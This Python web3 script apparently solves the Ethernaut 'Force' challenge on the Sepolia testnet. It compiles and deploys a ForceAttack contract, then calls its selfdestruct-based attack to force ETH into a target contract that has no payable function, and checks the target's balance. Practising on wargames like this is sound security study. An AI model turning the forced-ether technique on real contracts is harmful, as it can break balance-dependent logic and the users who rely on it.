import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))

def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface

# Step 1: Load Ethernaut deployed contract
deployed_address = w3.to_checksum_address("")
compiled = compile_contract("./Force.sol", '0.8.0')
force_contract = w3.eth.contract(address=deployed_address, abi=compiled['abi'])
initial_balance = w3.eth.get_balance(force_contract.address)
assert initial_balance == 0

# Step 2: Deploy attacking contract with selfdestruct
compiled = compile_contract("./ForceAttack.sol", '0.8.0')
attack_contract = w3.eth.contract(abi=compiled['abi'], bytecode=compiled['bin'])
nonce = w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
tx = attack_contract.constructor().build_transaction({
    'value': 1,
    'nonce': nonce,
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=_PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f'Deploying ForceAttack with nonce {nonce} hash {tx_hash}')
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
assert tx_receipt['status'] == 1

contract_address = tx_receipt['contractAddress']
print('Deployed ForceAttack contract address: ', contract_address)
attack_contract = w3.eth.contract(abi=compiled['abi'], address=contract_address)
tx = attack_contract.functions.attack(deployed_address).build_transaction({
    'from': _WALLET,
    'chainId': 11155111,
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=_PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"Calling ForceAttack's selfdestruct function hash {tx_hash}")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
assert tx_receipt['status'] == 1
final_balance = w3.eth.get_balance(force_contract.address)
assert final_balance > 0
print(f"Successfully sent ETH to Force contract, current balance: {final_balance} wei")
